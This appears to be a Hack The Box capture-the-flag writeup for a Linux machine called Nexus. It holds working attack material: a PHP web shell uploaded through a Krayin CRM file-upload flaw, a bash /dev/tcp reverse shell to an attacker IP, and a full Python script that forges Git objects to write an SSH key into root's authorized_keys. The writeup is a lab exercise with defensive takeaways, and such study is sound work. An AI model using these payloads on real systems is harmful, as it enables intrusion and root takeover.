# HTB: Nexus — Writeup

**Difficulty:** Easy (rated) / Medium (in practice)
**OS:** Linux
**Techniques:** Virtual host fuzzing, Git history secret mining, authenticated file upload RCE (CVE-2026-38526), credential reuse, path traversal via hand-crafted Git objects

---

## Overview

Nexus starts with a mostly static landing page that hides two virtual hosts behind it — a Gitea instance and a Krayin CRM billing portal. Digging through Git commit history reveals a database password that was blanked out in the current version of a config file but still present in an earlier commit. That password, combined with an email address scraped from a job advert on the main site, gets us into the Krayin CRM admin panel. From there, an authenticated file upload vulnerability (CVE-2026-38526) in the TinyMCE rich-text editor gives code execution as `www-data`. A second, freshly rotated credential found in the live `.env` file on disk gets us SSH access as `jones`. Privilege escalation to root abuses a custom systemd timer that recursively copies "template" Git repositories into a staging directory without sanitizing `..` path components — by hand-crafting raw Git objects (bypassing Gitea's UI-level filename validation entirely), we plant an SSH key at `/root/.ssh/authorized_keys`.

![placeholder: nmap scan results]

---

## Recon

### Nmap

Initial full port scan showed only two open ports:

- `22/tcp` — SSH
- `80/tcp` — HTTP

![placeholder: nmap output screenshot]

### Web Enumeration (Port 80)

Visiting the IP redirected to `nexus.htb`, added to `/etc/hosts`:

```
<target_ip>  nexus.htb
```

The landing page was mostly static text, but included a job advert for an "Operations Specialist - Customer Platforms" role, which leaked a couple of email addresses — including the hiring manager's address, `j.matthew@nexus.htb`. This was noted for later use.

![placeholder: landing page / job advert screenshot]

### Virtual Host Fuzzing

A directory brute-force against the main site turned up nothing interesting, so we pivoted to vhost fuzzing. The first attempt used an incorrect `Host` header:

```bash
ffuf -u http://nexus.htb -H "Host: FUZZ" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc 200
```

This returned nothing, because the `Host` header needs to actually resemble a subdomain of the target domain. Corrected:

```bash
ffuf -u http://nexus.htb -H "Host: FUZZ.nexus.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc 200
```

This still needed a word-count filter (`-fw`) to strip out the default/catch-all responses that were returning `200` for every guess. After filtering, two virtual hosts were confirmed:

- `git.nexus.htb`
- `billing.nexus.htb`

Both were added to `/etc/hosts`.

![placeholder: ffuf vhost results]

---

## Exploring Gitea (git.nexus.htb)

`git.nexus.htb` hosts a Gitea instance. Browsing "Explore" revealed a public, unauthenticated repository: `admin/krayin-docker-setup`.

The repo contained a Docker Compose file and an `.env` file. The current `.env` had:

```
DB_PASSWORD=
```

— empty. Since Git preserves history, the commit log was checked:

```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup
cd krayin-docker-setup
git log --oneline
git diff <old_commit> <new_commit>
```

An earlier commit contained the real (later-blanked) database password:

```
DB_PASSWORD=N27xh!!2ucY04
```

![placeholder: git diff showing recovered password]

---

## Krayin CRM Login (billing.nexus.htb)

`billing.nexus.htb` hosts a Krayin CRM login page. Combining the recovered database password with the email address found on the main site's job advert (`j.matthew@nexus.htb`) authenticated successfully into the Krayin admin dashboard.

The dashboard identified itself as Krayin CRM **v2.2.0**.

![placeholder: Krayin dashboard screenshot]

---

## Gaining a Foothold — CVE-2026-38526

A quick check of known CVEs against Krayin 2.2.0 turned up several, most notably:

- **CVE-2026-38526 (CVSS 9.9)** — Authenticated arbitrary file upload via `/admin/tinymce/upload`, leading to RCE.

Directly hitting `/admin/tinymce/upload` with a GET request returned a "method not allowed" error, confirming the endpoint's existence. The endpoint is wired up to TinyMCE's image-insert feature specifically (not the plain "insert link" button, and not the separate avatar/logo upload feature) — found by opening a new mail compose window, using the rich-text editor's image-insert toolbar button, and capturing the resulting request in Burp Suite.

### Captured legitimate request (structure)

```
POST /admin/tinymce/upload HTTP/1.1
Host: billing.nexus.htb
Content-Type: multipart/form-data; boundary=...

------boundary
Content-Disposition: form-data; name="_token"

<csrf token>
------boundary
Content-Disposition: form-data; name="file"; filename="images.jpeg"
Content-Type: image/jpeg

<jpeg bytes>
------boundary--
```

### Exploiting it

The server-side "jpg only" validation only checked the client-supplied filename/Content-Type — not the actual file contents. Modifying the request in Burp Repeater to upload a PHP payload while keeping `filename="shell.php"` and `Content-Type: image/jpeg` was sufficient:

```php
<?php SYSTEM($_REQUEST['cmd']); ?>
```

(Note: the array key must be quoted — an unquoted bareword like `$_REQUEST[cmd]` throws a fatal error on modern PHP versions, resulting in a silent HTTP 500 since `display_errors` was off on this server.)

The upload succeeded and returned the stored path:

```json
{"location":"http://billing.nexus.htb/storage/tinymce/<hash>.php"}
```

Testing `<?php phpinfo(); ?>` first confirmed PHP execution and confirmed `disable_functions` was empty, ruling out function-level restrictions as the cause of the earlier 500 error.

![placeholder: Burp Repeater upload request/response]

### Getting a shell

Command execution via `?cmd=` worked once the quoting was fixed. The initial reverse shell attempt used bash's `/dev/tcp` syntax directly:

```
?cmd=bash+-i+>%26+/dev/tcp/<attacker_ip>/1337+0>%261
```

This returned HTTP 200 but no connection landed. Root cause: `system()` executes via `/bin/sh`, which on this Ubuntu box is `dash`, not `bash` — and `dash` does not understand the `/dev/tcp` pseudo-device syntax, even though `bash` itself was present on the system (confirmed via `?cmd=which bash`).

The fix was to explicitly invoke `bash -c "..."` so the payload is interpreted by bash rather than the outer `sh`, being careful to URL-encode the payload exactly once (a double-encoding mistake on the `&` character caused an earlier failed attempt).

A listener (`nc -nlvp 1337`) caught the resulting shell as `www-data`, upgraded to a full TTY with:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![placeholder: reverse shell landing]

---

## User — Credential Reuse

As `www-data`, `/home/jones` and `/home/git` were visible but inaccessible. Re-checking the **live** application's `.env` file (as opposed to the version seen in the Git repo earlier) at the Krayin CRM install path on disk revealed a different, freshly rotated database password:

```
y27xb3ha!!74GbR
```

This password was tried against SSH for the visible local users and succeeded for `jones`:

```bash
ssh jones@nexus.htb
```

`user.txt` was retrieved from `/home/jones`.

![placeholder: user.txt / SSH as jones]

---

## Privilege Escalation — Git Path Traversal via Hand-Crafted Objects

### Enumeration

Standard quick checks (`sudo -l`, SUID binaries, crontabs, capabilities) turned up nothing as `jones`. `sudo -l` explicitly denied. `linpeas.sh` was transferred over (`python3 -m http.server` on the attacker box, `wget` on the target) and run.

linpeas flagged a custom systemd timer:

```
/etc/systemd/system/gitea-template-sync.timer
/etc/systemd/system/gitea-template-sync.service
```

```ini
# gitea-template-sync.timer
[Timer]
OnBootSec=1min
OnUnitActiveSec=1min
Unit=gitea-template-sync.service

# gitea-template-sync.service
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
```

Running as **root**, every minute.

### The vulnerable script

`/etc/gitea/template-sync.py` (world-readable) queries the Gitea API for all repos marked as "template", then for each one runs `git ls-tree -r HEAD` against the bare repo on disk and copies every tracked blob out to a staging directory, preserving the tracked path:

```python
for mode, objhash, filepath in entries:
    target = os.path.join(stage_path, filepath)
    ...
    # writes blob contents to `target`
```

`os.path.join` does not sanitize `..` components. If a tracked filepath inside a template repo's tree contains `..` segments, the script will happily write outside the intended staging directory — including, with enough `..` levels, all the way up to `/root/.ssh/authorized_keys`.

Gitea's web UI and normal Git commands both block creating a file or folder literally named `..`. However, this restriction is enforced at the application layer, not in Git's actual object format — a tree object is just a list of `(mode, name, hash)` entries, and nothing at the object-storage level validates the `name` field.

### The plan

Build the following structure by directly writing raw Git objects to `.git/objects/`, bypassing Gitea's UI/API validation entirely:

```
<repo root>
  ├── README.md          -> blob "# Template\n"
  └── ..
      └── ..
          └── ..
              └── ..
                  └── root
                      └── .ssh
                          └── authorized_keys   -> blob (attacker's SSH public key)
```

When the sync script walks this tree, the four nested `..` entries walk the staging path back up to `/`, landing the final write at `/root/.ssh/authorized_keys`.

### Writing the exploit script by hand

Git objects are stored as `<type> <size>\0<content>`, SHA-1 hashed for the object ID, zlib-compressed, and written to `.git/objects/<first 2 hex chars>/<remaining 38 hex chars>`. Built up incrementally:

```python
import hashlib
import zlib
import os
import time

def write_object(data, object_type):
    header_str = object_type + " " + str(len(data))
    header_as_bytes = header_str.encode('utf-8')
    header_bytes = header_as_bytes + b"\x00"
    full_content = header_bytes + data
    hashed_content = hashlib.sha1(full_content).hexdigest()
    compressed_content = zlib.compress(full_content)
    dir_name = hashed_content[0:2]
    file_name = hashed_content[2:]
    directory = os.path.join(".git", "objects", dir_name)
    os.makedirs(directory, exist_ok=True)
    full_path = os.path.join(directory, file_name)
    with open(full_path, "wb") as f:
        f.write(compressed_content)
    return hashed_content

def entry(mode, name, sha):
    data_str = mode + " " + name
    data_str_as_bytes = data_str.encode('utf-8')
    data_str_bytes = data_str_as_bytes + b"\x00"
    sha_bytes = bytes.fromhex(sha)
    full_content = data_str_bytes + sha_bytes
    return full_content

# --- Build the .ssh/authorized_keys blob and tree chain ---
key = "ssh-ed25519 AAAA...redacted... user@host"
data = key.encode('utf-8')

tree   = entry("100644", "authorized_keys", write_object(data, "blob"))
tree_sha = write_object(tree, "tree")

tree2  = entry("40000", ".ssh", tree_sha)
tree3  = entry("40000", "root", write_object(tree2, "tree"))
tree4  = entry("40000", "..", write_object(tree3, "tree"))
tree5  = entry("40000", "..", write_object(tree4, "tree"))
tree6  = entry("40000", "..", write_object(tree5, "tree"))
tree7  = entry("40000", "..", write_object(tree6, "tree"))
final_tree_sha = write_object(tree7, "tree")

# --- Repo root: README.md + the .. chain, side by side ---
readme_content = entry("100644", "README.md", write_object(b"# Template\n", "blob"))
top_tree = entry("40000", "..", final_tree_sha) + readme_content
top_tree_sha = write_object(top_tree, "tree")

# --- Commit object ---
timestamp = int(time.time())
commit = f"""tree {top_tree_sha}
author jones <jones@nexus.htb> {timestamp} +0000
committer jones <jones@nexus.htb> {timestamp} +0000

Initial commit
"""

commit_sha = write_object(commit.encode('utf-8'), "commit")

commit_path = os.path.join(".git", "refs", "heads", "main")
os.makedirs(os.path.dirname(commit_path), exist_ok=True)
with open(commit_path, "w") as f:
    f.write(commit_sha + "\n")
```

### Deployment

1. Generated a local SSH key pair (`ssh-keygen`) and put the **public** key into the `key` variable in the script above.
2. Logged into Gitea as `jones`, created a new empty repository, and checked **"Make repository a template"**.
3. Attempted to clone using `git.nexus.htb` from the target's own SSH session — this failed:

   ```
   fatal: unable to access 'http://git.nexus.htb/jones/Test.git/': Could not resolve host: git.nexus.htb
   ```

   `git.nexus.htb` only resolves on the attacker's own machine (via its local `/etc/hosts` entry) — the target machine itself has no DNS record for it. The `template-sync.py` script itself gave the fix: it talks to Gitea via `GITEA_URL = "http://localhost:3000"`. Cloning against `localhost:3000` instead (from within the target's own SSH session) worked correctly.
4. Cloned the empty template repo locally on the target (via `localhost:3000`), `cd`'d into it, and ran the exploit script — it writes directly into that repo's `.git/objects/` and `.git/refs/heads/main`.
5. Force-pushed the hand-crafted ref:

   ```bash
   git push -u origin main --force
   ```

![placeholder: pushing the crafted repo]

### Root

Within a minute, the `gitea-template-sync.timer` fired, the script (running as root) walked the malicious tree, and the SSH public key was written to `/root/.ssh/authorized_keys`. The corresponding private key was then used to SSH in directly as root:

```bash
ssh -i mykey root@nexus.htb
```

```
root@nexus:~# id
uid=0(root) gid=0(root) groups=0(root)
```

`root.txt` retrieved.

![placeholder: root shell / root.txt]

---

## Summary of Techniques

| Stage | Technique |
|---|---|
| Recon | Vhost fuzzing via `Host` header fuzzing with `ffuf` |
| Info leak | Git commit history retaining a "removed" secret |
| Auth | Credential + email pairing from two separate leaked sources |
| Foothold | CVE-2026-38526 — client-controlled file type validation bypass on a TinyMCE upload endpoint |
| Foothold (troubleshooting) | PHP array key quoting, `disable_functions` check, `dash` vs `bash` shell syntax differences |
| Lateral | Credential reuse between an old Git-tracked config and a live, rotated one |
| PrivEsc | Path traversal in a root-run systemd timer script, exploited by manually constructing raw Git objects to bypass Gitea's application-layer filename validation |

---

## Lessons / Takeaways

- Secrets removed from a file's *current* version are not gone if they were ever committed — always check history.
- Client-supplied `Content-Type`/filename on file uploads should never be trusted for validation; check magic bytes / re-encode server-side.
- `system()`/`exec()`-family calls run through `/bin/sh`, which is not guaranteed to be `bash` — don't assume bash-only syntax works out of the box.
- Application-layer input validation (e.g. Gitea blocking `..` as a filename) is not the same as data-format-level validation — if there's a lower-level API or protocol that bypasses the friendly UI, assume it might not enforce the same rules.
